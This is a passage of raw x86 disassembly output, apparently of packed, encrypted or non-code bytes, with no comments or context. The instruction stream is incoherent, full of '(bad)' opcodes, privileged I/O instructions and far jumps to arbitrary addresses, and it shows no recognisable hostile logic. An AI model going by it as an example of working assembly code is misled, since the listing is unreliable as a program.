  40388e:	add    BYTE PTR [esi+edi*8-0x3d7791b6],ah
  403895:	mov    eax,ds:0xee6a0f6
  40389a:	les    ebx,FWORD PTR [ebx*1+0x6fabd0ce]
  4038a1:	mov    esi,0x2bd46dec
  4038a6:	jmp    0x4804e8c
  4038ab:	add    BYTE PTR [ebx],bh
  4038ad:	sbb    al,0x57
  4038af:	into   
  4038b0:	call   0x49e4:0x8c34de51
  4038b7:	in     al,0x39
  4038b9:	mov    dh,0xde
  4038bb:	mov    al,ds:0xf21fc29d
  4038c0:	push   es
  4038c1:	jl     0x40389b
  4038c3:	iret   
  4038c4:	aam    0x0
  4038c6:	call   0x8da9:0x41990c8d
  4038cd:	gs jg  0x403910
  4038d0:	test   al,0x11
  4038d2:	xchg   edi,eax
  4038d3:	add    eax,0x39bbf1ad
  4038d8:	int    0x57
  4038da:	push   0x57
  4038dc:	xor    esi,DWORD PTR [ecx]
  4038de:	pop    ss
  4038df:	dec    esp
  4038e0:	add    eax,0x8439bcd9
  4038e5:	outs   dx,DWORD PTR ds:[esi]
  4038e6:	push   ss
  4038e7:	xlat   BYTE PTR ds:[ebx]
  4038e8:	retf   
  4038e9:	fxch   st(7)
  4038eb:	(bad)  
  4038ec:	dec    esi
  4038ed:	jae    0x40393b
  4038ef:	jmp    0x5ccfc353
  4038f4:	add    ecx,DWORD PTR [edx]
  4038f6:	and    ch,BYTE PTR [ebp+0x24]
  4038f9:	rol    DWORD PTR [ebx+edi*2+0x24],cl
  4038fd:	push   cs
  4038fe:	rol    bh,1
  403900:	in     al,dx
  403901:	(bad)  
  403902:	js     0x403896
  403904:	cwde   
  403905:	idiv   DWORD PTR [ecx+ecx*2]
  403908:	jmp    0x4038a1
  40390a:	mov    al,ds:0x2d44acd6
  403910:	mov    ebx,DWORD PTR [edi+0x13019464]
  403916:	hlt    
  403917:	ja     0x403972
  403919:	in     eax,0x37
  40391b:	dec    ebx
  40391c:	cmp    al,0xc1
  40391e:	push   es
  40391f:	call   0xaf8834be
  403924:	(bad)  
  403925:	cmp    dh,dl
  403927:	dec    esi
  403928:	sbb    ah,0xf5
  40392b:	and    eax,0x47a87176
  403930:	cdq    
  403931:	xlat   BYTE PTR ds:[ebx]
  403932:	retf   
  403933:	pop    esp
  403934:	ins    BYTE PTR es:[edi],dx
  403935:	dec    ebp
  403936:	out    dx,eax
  403937:	dec    BYTE PTR [esi+0x1747935]
  40393d:	inc    ebp
  40393e:	cmc    
  40393f:	test   eax,0xb4614570
  403944:	pop    ecx
  403945:	mov    ebp,ecx
  403947:	(bad)  
  403949:	sbb    al,0x6d
  40394b:	test   al,0x75
  40394d:	arpl   WORD PTR [ecx-0x24eb578],bx
  403953:	inc    eax
  403954:	inc    esp
  403955:	inc    esi
  403956:	and    DWORD PTR ss:[esi],edi
  403959:	pop    edi
  40395a:	or     eax,DWORD PTR [ebx-0xdc83ae0]
  403960:	lds    ecx,FWORD PTR [ebx]
  403962:	cmp    BYTE PTR ds:0xa455fd55,0xf8
  403969:	jmp    FWORD PTR [edi-0x4]
  40396c:	fwait
  40396d:	ja     0x4038f8
  40396f:	add    eax,0xe7b99785
  403974:	push   edi
  403975:	cmp    ch,0x76
  403978:	pop    es
  403979:	fnstenv [edi+ebx*2+0x20]
  40397d:	add    eax,0xcdb4766c
  403982:	sbb    ecx,DWORD PTR [ecx-0xc]
  403985:	ins    DWORD PTR es:[edi],dx
  403986:	mov    ah,BYTE PTR [edx-0x7a6229a7]
  40398c:	push   ss
  40398d:	push   eax
  40398e:	aam    0xe
  403990:	add    BYTE PTR [edi+0x18577315],bl
  403996:	ret    
  403997:	int3   
  403998:	inc    ebx
  403999:	inc    ecx
  40399a:	cmp    al,0xe4
  40399c:	cmp    edx,DWORD PTR [ecx]
  40399e:	popf   
  40399f:	xor    edx,edx
  4039a1:	stos   DWORD PTR es:[edi],eax
  4039a2:	fs inc esp
  4039a4:	inc    edx
  4039a5:	(bad)  
  4039a6:	std    
  4039a7:	cmp    edi,ebx
  4039a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039aa:	cdq    
  4039ab:	sub    DWORD PTR [eax+0x67],edi
  4039ae:	ins    BYTE PTR es:[edi],dx
  4039af:	in     al,dx
  4039b0:	mov    bh,0x61
  4039b2:	stos   BYTE PTR es:[edi],al
  4039b3:	add    ch,BYTE PTR [ebx-0x30]
  4039b6:	arpl   WORD PTR [ecx],ax
  4039b8:	mov    esi,ecx
  4039ba:	pop    esp
  4039bb:	movntq (bad),mm5
  4039bc:	out    0xe8,eax
  4039be:	hlt    
  4039bf:	lock dec esp
  4039c1:	shr    BYTE PTR ds:0x540de4,1
  4039c7:	into   
  4039c8:	iret   
  4039c9:	ret    
  4039ca:	dec    edx
  4039cb:	sbb    eax,0x68289f7e
  4039d0:	cwde   
  4039d1:	mov    ebx,0x79a48cc5
  4039d6:	mov    dh,0xd7
  4039d8:	cld    
  4039d9:	(bad)  
  4039da:	aam    0xf
  4039dc:	imul   ebp,DWORD PTR [edi+0x7cb11b35],0x3f
  4039e3:	cmp    ch,BYTE PTR [edx-0x66]
  4039e6:	dec    eax
  4039e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039e8:	and    esp,edi
  4039ea:	push   ds
  4039eb:	stos   DWORD PTR es:[edi],eax
  4039ec:	je     0x403a2f
  4039ee:	or     eax,DWORD PTR [ebx-0x6]
  4039f1:	mov    bl,0x5d
  4039f3:	in     al,0x6f
  4039f5:	mov    edx,DWORD PTR [eax]
  4039f7:	mov    ebp,0x1cabf510
  4039fc:	stc    
  4039fd:	bnd jmp 0x403a55
  403a00:	pop    eax
  403a01:	call   0x22fc567d
  403a06:	ja     0x403a4a
  403a08:	jb     0x403a31
  403a0a:	ins    DWORD PTR es:[edi],dx
  403a0b:	(bad)  
  403a0c:	jmp    0xb31dd42b
  403a11:	mov    ss,WORD PTR [ecx+ecx*4]
  403a14:	mov    edi,0x60c8b157
  403a19:	xchg   ebx,eax
  403a1a:	dec    edx
  403a1b:	pop    ecx
  403a1c:	scas   eax,DWORD PTR es:[edi]
  403a1d:	int3   
  403a1e:	push   edi
  403a1f:	aam    0xff
  403a21:	pop    ebx
  403a22:	mov    bh,0xb7
  403a24:	mov    eax,0x25d9e4bb
  403a29:	inc    esp
  403a2a:	pop    esp
  403a2b:	repz ja 0x403a58
  403a2e:	call   DWORD PTR [eax-0x58]
  403a31:	(bad)  
  403a32:	fsubr  QWORD PTR [eax]
  403a34:	and    DWORD PTR [ecx+0x2ee5fc6d],edx
  403a3a:	lea    eax,[esi+esi*4]
  403a3d:	mov    ds:0xd1ec84ad,eax
  403a42:	cmp    bl,BYTE PTR [ecx+0x16]
  403a45:	fist   DWORD PTR [eax]
  403a47:	ins    BYTE PTR es:[edi],dx
  403a48:	repnz xchg esi,eax
  403a4a:	push   ds
  403a4b:	fisubr WORD PTR [eax-0x69b15f91]
  403a51:	outs   dx,DWORD PTR ds:[esi]
  403a52:	cmp    eax,0x7dd170d7
  403a57:	ins    DWORD PTR es:[edi],dx
  403a58:	jge    0x403a79
  403a5a:	setb   ah
  403a5d:	dec    ebx
  403a5e:	inc    ecx
  403a5f:	out    0x45,eax
  403a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a62:	popa   
  403a63:	and    eax,0x1a50a6dc
  403a68:	sbb    ah,bl
  403a6a:	icebp  
  403a6b:	fldcw  WORD PTR [eax+0x777c986d]
  403a71:	cmp    DWORD PTR [ebp-0x3fb022bb],edi
  403a77:	or     al,0xd9
  403a79:	push   eax
  403a7a:	in     al,0xb
  403a7c:	loop   0x403aaa
  403a7e:	or     BYTE PTR [edi+eax*1],dh
  403a81:	jbe    0x403a33
  403a83:	mov    esi,0x9ebda698
  403a88:	xchg   edi,eax
  403a89:	mov    fs,WORD PTR [edi]
  403a8b:	adc    cl,bl
  403a8d:	shl    BYTE PTR [ebp-0x3],1
  403a90:	leave  
  403a91:	cli    
  403a92:	pusha  
  403a93:	stos   BYTE PTR es:[edi],al
  403a94:	add    DWORD PTR [edi-0x1a],0xffffffb0
  403a98:	rcr    DWORD PTR [eax-0x6eabee89],0xe7
  403a9f:	inc    ecx
  403aa0:	cmc    
  403aa1:	pop    ds
  403aa2:	mov    fs,WORD PTR [eax]
  403aa4:	sub    dl,BYTE PTR [edi+0x3e182a6]
  403aaa:	pop    es
  403aab:	je     0x403ac6
  403aad:	push   eax
  403aae:	mov    edi,0xb9109613
  403ab3:	inc    esp
  403ab4:	imul   eax,DWORD PTR ds:[ecx-0x8d81d7f],0x6fe5c1ef
  403abf:	enter  0xbfe,0x2c
  403ac3:	pop    ds
  403ac4:	ja     0x403b26
  403ac6:	xor    eax,0xc1c4dd7d
  403acb:	or     DWORD PTR [edx+0x22a30b85],ebx
  403ad1:	ja     0x403b3a
  403ad3:	dec    edi
  403ad4:	imul   ebp,esi,0x6db9f840
  403ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403adb:	cmp    al,0x54
  403add:	and    eax,0x1bab00a0
  403ae2:	in     al,dx
  403ae3:	pop    ebp
  403ae4:	jge    0x403b44
  403ae6:	adc    ch,ch
  403ae8:	push   ss
  403ae9:	stos   DWORD PTR es:[edi],eax
  403aea:	arpl   WORD PTR [ebp-0x3495111a],si
  403af0:	jne    0x403b02
  403af2:	and    BYTE PTR [edx+0x3f859882],cl
  403af8:	add    eax,0x202babbb
  403afd:	or     al,0x38
  403aff:	(bad)  
  403b00:	mov    bh,cl
  403b02:	inc    eax
  403b03:	das    
  403b04:	icebp  
  403b05:	inc    ecx
  403b06:	test   eax,0x7919e27b
  403b0b:	daa    
  403b0c:	xchg   ecx,eax
  403b0d:	dec    edx
  403b0e:	push   0x7d
  403b10:	(bad)  
  403b12:	(bad)  
  403b14:	xchg   ebp,eax
  403b15:	cmp    dh,BYTE PTR [ebx*8+0x673c0bfb]
  403b1c:	pop    eax
  403b1d:	xor    eax,0xd6468c0a
  403b22:	mov    bh,0xfe
  403b24:	mov    bh,0x13
  403b26:	xchg   edi,eax
  403b27:	retf   0x7bd1
  403b2a:	adc    BYTE PTR [ecx],0x2
  403b2d:	jae    0x403b04
  403b2f:	and    BYTE PTR [edi+0x44],bh
  403b32:	add    al,0x2a
  403b34:	rcr    DWORD PTR [eax+0x3d3a7dde],0x54
  403b3b:	iret   
  403b3c:	test   eax,ecx
  403b3e:	xchg   ecx,eax
  403b3f:	or     BYTE PTR [edx],bl
  403b41:	and    BYTE PTR [edi-0x1a],0x88
  403b45:	inc    eax
  403b46:	or     bh,BYTE PTR [eax]
  403b48:	push   ecx
  403b49:	lahf   
  403b4a:	xor    ch,BYTE PTR [ebp-0x3f4ae611]
  403b50:	out    0x95,eax
  403b52:	scas   al,BYTE PTR es:[edi]
  403b53:	retf   
  403b54:	dec    ebp
  403b55:	jecxz  0x403ae9
  403b57:	sub    BYTE PTR [edi],0x5d
  403b5a:	push   0x79ccb993
  403b5f:	fidivr WORD PTR [edx+0x6be4ba6a]
  403b65:	cmp    BYTE PTR [edx-0x45],al
  403b68:	xchg   esi,eax
  403b69:	scas   eax,DWORD PTR es:[edi]
  403b6a:	into   
  403b6b:	jb     0x403aee
  403b6d:	sbb    BYTE PTR [eax-0x79ce8567],bh
  403b73:	push   ebx
  403b74:	jns    0x403b8d
  403b76:	stos   DWORD PTR es:[edi],eax
  403b77:	lahf   
  403b78:	xor    DWORD PTR [esi-0x312d1a3f],edx
  403b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b7f:	out    dx,eax
  403b80:	fcomp  DWORD PTR [esi+0xa]
  403b83:	pop    eax
  403b84:	loope  0x403bee
  403b86:	sbb    DWORD PTR [eax+0x2c578a3a],0xffffff82
  403b8d:	ins    BYTE PTR es:[edi],dx
  403b8e:	xchg   edi,eax
  403b8f:	push   0xffffffb4
  403b91:	scas   al,BYTE PTR es:[edi]
  403b92:	jge    0x403b9e
  403b94:	jmp    0xee1:0xc3f4195a
  403b9b:	daa    
  403b9c:	rcr    BYTE PTR [edx+0x4f93f601],1
  403ba2:	int    0x79
  403ba4:	sub    BYTE PTR [edx],bl
  403ba6:	sbb    eax,0xea0e4636
  403bab:	jge    0x403c03
  403bad:	jmp    0x557:0x36f0985a
  403bb4:	cmp    DWORD PTR [ebp+0x37],esi
  403bb7:	xlat   BYTE PTR ds:[ebx]
  403bb8:	call   0x3529:0xf2e0fac
  403bbf:	sub    ch,BYTE PTR [ebp+eax*4-0xb]
  403bc3:	add    ch,BYTE PTR [edi+0x54]
  403bc6:	xchg   edi,eax
  403bc7:	jbe    0x403bc2
  403bc9:	mov    bl,BYTE PTR [ebx+0x54]
  403bcc:	mov    ebx,0x9ace7eff
  403bd1:	add    al,0x75
  403bd3:	sub    BYTE PTR [esi-0x75a5bc89],cl
  403bd9:	clc    
  403bda:	test   BYTE PTR [ebp+0x4089e320],dh
  403be0:	hlt    
  403be1:	push   eax
  403be2:	aam    0xa8
  403be4:	mov    es,WORD PTR [ebx]
  403be6:	loop   0x403b87
  403be8:	sti    
  403be9:	xlat   BYTE PTR ds:[ebx]
  403bea:	adc    BYTE PTR [esp+ebp*4],cl
  403bed:	or     edx,DWORD PTR [esi+ebx*4+0x24e69692]
  403bf4:	lods   al,BYTE PTR ds:[esi]
  403bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bf6:	dec    eax
  403bf7:	push   edx
  403bf8:	in     eax,0x7b
  403bfa:	inc    eax
  403bfb:	cs jmp 0x403c51
  403bfe:	mov    al,ds:0x25f41a3e
  403c03:	aad    0x65
  403c05:	or     eax,0x8ac431b1
  403c0a:	or     cl,dl
  403c0c:	rcr    DWORD PTR [edi+0x20],cl
  403c0f:	iret   
  403c10:	mov    bh,BYTE PTR [edi]
  403c12:	lahf   
  403c13:	arpl   bp,bp
  403c15:	xchg   DWORD PTR [edx-0x16],ebp
  403c18:	test   eax,0x95228791
  403c1d:	xchg   edx,eax
  403c1e:	(bad)  [edx+eiz*1+0x4eac3c35]
  403c25:	outs   dx,DWORD PTR ds:[esi]
  403c26:	pop    ds
  403c27:	fisub  DWORD PTR [esi+0x59]
  403c2a:	(bad)  
  403c2b:	inc    esp
  403c2c:	add    esi,DWORD PTR [ebp+ecx*1+0x4c]
  403c30:	enter  0x335c,0x98
  403c34:	rcl    DWORD PTR [edi+0x5d9f3afb],cl
  403c3a:	mov    cl,0xf1
  403c3c:	loopne 0x403c01
  403c3e:	popf   
  403c3f:	(bad)  
  403c40:	cli    
  403c41:	test   DWORD PTR [edi+edi*8],esi
  403c44:	into   
  403c45:	stos   DWORD PTR es:[edi],eax
  403c46:	cmp    bl,cl
  403c48:	aad    0x6b
  403c4a:	je     0x403bce
  403c4c:	push   edi
  403c4d:	jecxz  0x403c96
  403c4f:	repz arpl di,di
  403c52:	imul   ebp,esp,0xdf12c8e3
  403c58:	push   eax
  403c59:	mov    ecx,0x4e14dfad
  403c5e:	daa    
  403c5f:	ss pushf 
  403c61:	add    DWORD PTR [ebp-0x5809cbe5],ecx
  403c67:	mov    bh,0x89
  403c69:	jae    0x403c6d
  403c6b:	es xchg edi,eax
  403c6d:	pop    ebx
  403c6e:	test   DWORD PTR ds:0xaa0e0eaf,ebp
  403c74:	sbb    BYTE PTR [eax-0x5f],bh
  403c77:	mov    bh,0x5e
  403c79:	adc    edi,DWORD PTR [ebx]
  403c7b:	push   ebp
  403c7c:	xchg   ebx,eax
  403c7d:	je     0x403c4a
  403c7f:	or     al,0xb4
  403c81:	add    ebp,DWORD PTR [eax+ebp*2-0x57]
  403c85:	bnd jae 0x403cd5
  403c88:	pop    esi
  403c89:	jge    0x403ced
  403c8b:	jmp    FWORD PTR [ebx+0x77]
  403c8e:	iret   
  403c8f:	(bad)  
  403c91:	fsubr  DWORD PTR [eax+eiz*1-0x58]
  403c95:	inc    ebx
  403c96:	cdq    
  403c97:	retf   0x8b90
  403c9a:	div    DWORD PTR [eax+0x513a99fc]
  403ca0:	xchg   ebp,eax
  403ca1:	pushf  
  403ca2:	lods   eax,DWORD PTR ds:[esi]
  403ca3:	clc    
  403ca4:	inc    edi
  403ca5:	ins    DWORD PTR es:[edi],dx
  403ca6:	out    0x8,al
  403ca8:	enter  0xa26a,0x90
  403cac:	push   eax
  403cad:	repz push esi
  403caf:	xchg   ebx,eax
  403cb0:	and    eax,0x70caafe7
  403cb5:	add    DWORD PTR [esi-0x3a],esi
  403cb8:	mov    eax,ds:0x8d0bffb2
  403cbd:	data16 cmp dh,BYTE PTR [ecx]
  403cc0:	xchg   BYTE PTR [edx+0x7a],bh
  403cc3:	inc    esi
  403cc4:	add    al,0x97
  403cc6:	or     DWORD PTR [edx],ebp
  403cc8:	dec    DWORD PTR [esi]
  403cca:	shr    esp,0xd8
  403ccd:	lea    ebx,[ebp+0x14]
  403cd0:	adc    al,0xe8
  403cd2:	jae    0x403ce7
  403cd4:	sti    
  403cd5:	ret    0x5f74
  403cd8:	sub    al,0x38
  403cda:	sti    
  403cdb:	popf   
  403cdc:	(bad)
  403ce0:	repz jb 0x403d41
  403ce3:	retf   
  403ce4:	leave  
  403ce5:	popf   
  403ce6:	inc    edx
  403ce7:	jmp    0x403d26
  403ce9:	fidiv  WORD PTR [edx]
  403ceb:	xor    ebx,esi
  403ced:	pop    ecx
  403cee:	jnp    0x403cf1
  403cf0:	jo     0x403cea
  403cf2:	sub    al,0xda
  403cf4:	imul   ebp,DWORD PTR [ebx],0xdc48beda
  403cfa:	enter  0x65d7,0x76
  403cfe:	stos   DWORD PTR es:[edi],eax
  403cff:	or     bl,bl
  403d01:	arpl   ax,dx
  403d03:	xor    BYTE PTR [ecx+edx*8+0x7b0cea52],0x6e
  403d0b:	fist   WORD PTR [ebx*4+0x2f062164]
  403d12:	mov    ds:0xe47c3ce6,eax
  403d17:	loopne 0x403cb1
  403d19:	xchg   ebx,eax
  403d1a:	mov    bl,0x74
  403d1c:	je     0x403d46
  403d1e:	and    BYTE PTR [ebp+0xa],bh
  403d21:	cwde   
  403d22:	iret   
  403d23:	jmp    0x7c16405
  403d28:	adc    al,0x29
  403d2a:	in     eax,dx
  403d2b:	ret    
  403d2c:	ins    DWORD PTR es:[edi],dx
  403d2d:	fisttp WORD PTR [esi-0x21]
  403d30:	inc    esp
  403d31:	je     0x403d48
  403d33:	and    BYTE PTR [ecx],cl
  403d35:	or     BYTE PTR ds:0x551229d2,bh
  403d3b:	pop    ecx
  403d3c:	mov    al,0x4c
  403d3e:	or     DWORD PTR [eax+0x1d],ecx
  403d41:	stos   DWORD PTR es:[edi],eax
  403d42:	sti    
  403d43:	rcl    BYTE PTR [eax],1
  403d45:	inc    esp
  403d46:	scas   al,BYTE PTR es:[edi]
  403d47:	and    edi,DWORD PTR [esi+0x14]
  403d4a:	in     al,0xd3
  403d4c:	iret   
  403d4d:	mov    ebp,0x6e4ae334
  403d52:	pop    ds
  403d53:	iret   
  403d54:	retf   
  403d55:	dec    esp
  403d56:	out    dx,al
  403d57:	push   ebp
  403d58:	cld    
  403d59:	add    cl,bl
  403d5b:	sbb    edx,DWORD PTR [esi]
  403d5d:	(bad)  
  403d5e:	(bad)  
  403d5f:	popa   
  403d60:	lds    esp,FWORD PTR [esi+0x55]
  403d63:	xor    BYTE PTR [edx-0x90a265],ch
  403d69:	stos   DWORD PTR es:[edi],eax
  403d6a:	xlat   BYTE PTR ds:[ebx]
  403d6b:	fwait
  403d6c:	mov    edi,0x34b50fd4
  403d71:	arpl   WORD PTR [edx+0x1d],cx
  403d74:	push   edx
  403d75:	push   ebx
  403d76:	bound  ebx,QWORD PTR [ebx]
  403d78:	mov    BYTE PTR [edx-0x3390a724],bl
  403d7e:	push   0xffffffd4
  403d80:	xor    dl,al
  403d82:	lods   al,BYTE PTR ds:[esi]
  403d83:	adc    BYTE PTR [ebx+0x4],ch
  403d86:	push   esp
  403d87:	lods   eax,DWORD PTR ds:[esi]
  403d88:	popa   
  403d89:	mov    ds:0xf6aea832,eax
  403d8e:	in     eax,dx
  403d8f:	adc    al,0x2
  403d91:	stos   DWORD PTR es:[di],eax
  403d93:	gs aas 
  403d95:	mov    edi,DWORD PTR [ebx]
  403d97:	jg     0x403d2e
  403d99:	mov    cl,0x30
  403d9b:	inc    ecx
  403d9c:	push   ebx
  403d9d:	xchg   ebx,eax
  403d9e:	aad    0xb5
  403da0:	adc    eax,0xec77def3
  403da5:	hlt    
  403da6:	stos   BYTE PTR es:[edi],al
  403da7:	push   ds
  403da8:	ss ins BYTE PTR es:[edi],dx
  403daa:	out    dx,eax
  403dab:	pop    ss
  403dac:	dec    ebp
  403dad:	inc    ebx
  403dae:	(bad)  
  403daf:	enter  0x7e56,0xc6
  403db3:	mov    edx,0x31a06457
  403db8:	and    eax,0x7d7f801b
  403dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dbe:	pop    esp
  403dbf:	ja     0x403e15
  403dc1:	popa   
  403dc2:	fisubr DWORD PTR [esi-0x43021f3d]
  403dc8:	or     esi,DWORD PTR [ebx+ebx*8-0x13]
  403dcc:	mov    edi,DWORD PTR ds:0x3500c0ef
  403dd2:	pushf  
  403dd3:	mov    bh,0xae
  403dd5:	aad    0x51
  403dd7:	outs   dx,DWORD PTR ds:[esi]
  403dd8:	adc    cl,bh
  403dda:	mov    esi,0xd226b35d
  403ddf:	push   edx
  403de0:	push   0xfd7d30e9
  403de5:	test   eax,0x7ed18ec9
  403dea:	adc    cl,cl
  403dec:	jmp    0x403e1c
  403dee:	ret    0xbdf0
  403df1:	push   ds
  403df2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403df3:	test   BYTE PTR [edx+0x4cad8ab3],ch
  403df9:	mov    bl,0xbc
  403dfb:	add    eax,0x69d9df2a
  403e00:	cmp    eax,DWORD PTR [esi]
  403e02:	sub    al,0xa6
  403e04:	and    al,0xae
  403e06:	outs   dx,BYTE PTR ds:[esi]
  403e07:	imul   eax,DWORD PTR [edi-0x59b3628b],0xffffffd7
  403e0e:	lods   al,BYTE PTR cs:[esi]
  403e10:	aaa    
  403e11:	push   es
  403e12:	push   0xfb588c
  403e17:	and    al,0xea
  403e19:	jne    0x403e0f
  403e1b:	mov    ebx,0x1a0c1e93
  403e20:	add    DWORD PTR [edx-0x345a2532],edi
  403e26:	push   edx
  403e27:	in     al,dx
  403e28:	pop    ss
  403e29:	inc    esi
  403e2a:	sub    al,0x60
  403e2c:	mov    edx,0xb3059ef1
  403e31:	call   0x9221946f
  403e36:	sbb    bh,ch
  403e38:	dec    ebx
  403e39:	sahf   
  403e3a:	je     0x403e4d
  403e3c:	ret    0x7c2e
  403e3f:	pop    edi
  403e40:	ja     0x403e81
  403e42:	ja     0x403dd0
  403e44:	inc    ecx
  403e45:	sbb    ch,BYTE PTR [ecx+0x3e]
  403e48:	scas   al,BYTE PTR es:[edi]
  403e49:	lea    ebx,[eax]
  403e4b:	and    DWORD PTR [eax],esi
  403e4d:	test   DWORD PTR [ecx],ecx
  403e4f:	mov    eax,ds:0x8ff954b3
  403e54:	mov    al,BYTE PTR [ebx]
  403e56:	xor    BYTE PTR [eax*2-0x18559da],al
  403e5d:	inc    edx
  403e5e:	sbb    DWORD PTR [eax],edx
  403e60:	not    dl
  403e62:	xchg   esp,eax
  403e63:	xchg   esp,eax
  403e64:	cli    
  403e65:	xchg   DWORD PTR [ecx-0x30],ebx
  403e68:	icebp  
  403e69:	ret    
  403e6a:	loop   0x403e5b
  403e6c:	sti    
  403e6d:	sti    
  403e6e:	mov    ebx,0xe8e10f6f
  403e73:	jmp    0x301fa53
  403e78:	push   esi
  403e79:	push   ss
  403e7a:	(bad)
  403e7e:	and    esi,DWORD PTR [ebp+esi*8+0x1f]
  403e82:	jmp    0x403e47
  403e84:	or     ebp,ecx
  403e86:	stos   BYTE PTR es:[edi],al
  403e87:	int    0xe6
  403e89:	call   0xfae6:0x9794907
  403e90:	leave  
  403e91:	inc    ebx
  403e92:	mov    al,ds:0xec78e45d
  403e97:	add    al,0x85
  403e99:	xor    esi,DWORD PTR [ecx]
  403e9b:	xchg   esp,eax
  403e9c:	fcomp  DWORD PTR [ebx+eiz*4+0x7f]
  403ea0:	dec    ecx
  403ea1:	cmp    edi,ecx
  403ea3:	in     al,0x67
  403ea5:	mov    ch,0xc6
  403ea7:	out    dx,al
  403ea8:	inc    edi
  403ea9:	mov    ebx,0xace0c13
  403eae:	psubb  mm6,QWORD PTR [esi-0x4f]
  403eb2:	out    dx,eax
  403eb3:	cdq    
  403eb4:	arpl   bp,bx
  403eb6:	ss mov ch,0x75
  403eb9:	xchg   ebp,eax
  403eba:	xor    al,0xd9
  403ebc:	push   eax
  403ebd:	bndstx [eax],bnd1
  403ec0:	xlat   BYTE PTR ds:[ebx]
  403ec1:	and    ch,BYTE PTR [ecx]
  403ec3:	mov    esi,0xdceda3f2
  403ec8:	inc    ecx
  403ec9:	in     eax,0xf8
  403ecb:	xchg   DWORD PTR [eax-0x11],ebp
  403ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ecf:	cld    
  403ed0:	and    ah,BYTE PTR [ebx+0xd]
  403ed3:	push   cs
  403ed4:	leave  
  403ed5:	adc    ch,BYTE PTR [ebp+0xc]
  403ed8:	lahf   
  403ed9:	lods   eax,DWORD PTR ds:[esi]
  403eda:	dec    esi
  403edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403edc:	cwde   
  403edd:	mov    eax,0xdd48ac5c
  403ee2:	jmp    0xa5e0:0x41d5311a
  403ee9:	xchg   ebx,eax
  403eea:	sub    edx,DWORD PTR [edi]
  403eec:	call   0x2473:0x44596ea
  403ef3:	ins    DWORD PTR es:[edi],dx
  403ef4:	pop    ebx
  403ef5:	(bad)  
  403ef6:	out    0xd2,eax
  403ef8:	xchg   ebp,eax
  403ef9:	mov    esi,0x816d19f1
  403efe:	xor    BYTE PTR ss:[ebx+0x5070f9ae],cl
  403f05:	bound  esi,QWORD PTR [edi-0x10]
  403f08:	shr    ebp,0x54
  403f0b:	rcl    DWORD PTR [ebp+0x28],cl
  403f0e:	int    0xdc
  403f10:	xor    BYTE PTR [ecx],ah
  403f12:	lahf   
  403f13:	cmc    
  403f14:	iret   
  403f15:	out    dx,eax
  403f16:	and    DWORD PTR [esi+0x3],eax
  403f19:	xchg   esi,eax
  403f1a:	out    dx,eax
  403f1b:	pop    ss
  403f1c:	daa    
  403f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f1e:	sbb    BYTE PTR [edx-0x16],dh
  403f21:	test   BYTE PTR [edx-0xa],dl
  403f24:	clc    
  403f25:	(bad)  
  403f26:	xor    ebp,esi
  403f28:	test   eax,0x3086c525
  403f2d:	aam    0x15
  403f2f:	fstp   DWORD PTR [ecx]
  403f31:	aas    
  403f32:	sub    al,0x68
  403f34:	adc    cl,BYTE PTR [ecx+esi*4]
  403f37:	lock sub BYTE PTR [edi+ebp*4-0x15],cl
  403f3c:	cs jmp 0xf31e:0x2c5b3fd1
  403f44:	mov    dh,0xb5
  403f46:	bound  esi,QWORD PTR [esi]
  403f48:	jg     0x403f40
  403f4a:	or     edx,ebp
  403f4c:	out    0xd9,eax
  403f4e:	dec    edi
  403f4f:	bnd jbe 0x403f98
  403f52:	cmp    ecx,DWORD PTR [edi+0x65d91720]
  403f58:	test   DWORD PTR [eax],esi
  403f5a:	daa    
  403f5b:	ins    DWORD PTR es:[edi],dx
  403f5c:	xchg   esi,eax
  403f5d:	add    BYTE PTR ds:0xb5ecdb7b,dh
  403f63:	sahf   
  403f64:	inc    ebp
  403f65:	add    DWORD PTR [ebx+0x39bb5d12],edi
  403f6b:	xchg   edx,eax
  403f6c:	push   eax
  403f6d:	lds    esi,FWORD PTR [esi]
  403f6f:	shr    ebx,0xf
  403f72:	out    dx,al
  403f73:	out    0x1b,al
  403f75:	mov    DWORD PTR [esi],ebp
  403f77:	jmp    0x7426b649
  403f7c:	mov    dl,0x90
  403f7e:	ret    0x7580
  403f81:	inc    esp
  403f82:	push   ecx
  403f83:	int    0x7f
  403f85:	pusha  
  403f86:	jb     0x403f9b
  403f88:	adc    DWORD PTR [eax+0xa],0x9a5f3cf6
  403f8f:	pop    ds
  403f90:	fstp   DWORD PTR [ebp+0x31]
  403f93:	xor    BYTE PTR [ecx-0x3be7a32b],cl
  403f99:	test   eax,0x7b05d807
  403f9e:	fwait
  403f9f:	out    0x20,al
  403fa1:	stc    
  403fa2:	data16 add cl,cl
  403fa5:	shl    DWORD PTR [edi+0x56],cl
  403fa8:	js     0x403fa4
  403faa:	sub    eax,esi
  403fac:	cli    
  403fad:	adc    edi,DWORD PTR [edi+0x14e4ccbb]
  403fb3:	arpl   WORD PTR [ebx+0x2ecb4261],bx
  403fb9:	push   ebx
  403fba:	pop    es
  403fbb:	jno    0x403f6b
  403fbd:	pop    ecx
  403fbe:	push   es
  403fbf:	push   esp
  403fc0:	push   edi
  403fc1:	loop   0x403ff8
  403fc3:	push   esi
  403fc4:	jne    0x403f78
  403fc6:	test   eax,0xb43ea005
  403fcb:	mov    eax,ds:0xbc0e6946
  403fd0:	int3   
  403fd1:	call   0xd48df15e
  403fd6:	ret    0x3767
  403fd9:	sub    al,0xc0
  403fdb:	cmp    BYTE PTR [ecx],bh
  403fdd:	in     al,0xa0
  403fdf:	icebp  
  403fe0:	pushf  
  403fe1:	jb     0x403feb
  403fe3:	(bad)  
  403fe4:	(bad)  [ecx]
  403fe6:	hlt    
  403fe7:	push   0xe2a5bb98
  403fec:	or     edx,DWORD PTR [ecx-0x3f7765b9]
  403ff2:	ins    DWORD PTR es:[edi],dx
  403ff3:	xchg   ebp,eax
